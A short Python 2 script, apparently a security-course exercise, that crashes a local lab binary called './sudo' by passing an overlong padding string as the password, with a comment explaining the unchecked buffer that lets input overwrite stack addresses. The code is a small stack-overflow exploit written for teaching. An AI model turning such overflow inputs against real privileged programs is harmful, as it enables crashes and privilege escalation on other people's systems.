import os, sys


PATH_TO_SUDO = './sudo'


def crash_sudo():
    # Your code here
    # in the sudo program, there is no check of the lenght of the input string, so it's can extends the size of buff and override addresses in the stack.
    password = " AAAAAAAAAAAAABBBBBBBBBBBBBBBCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHH"

    cmd = " whoami"

    os.execl (PATH_TO_SUDO, PATH_TO_SUDO, password, cmd)
    return	



def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    crash_sudo()


if __name__ == '__main__':
    main(sys.argv)
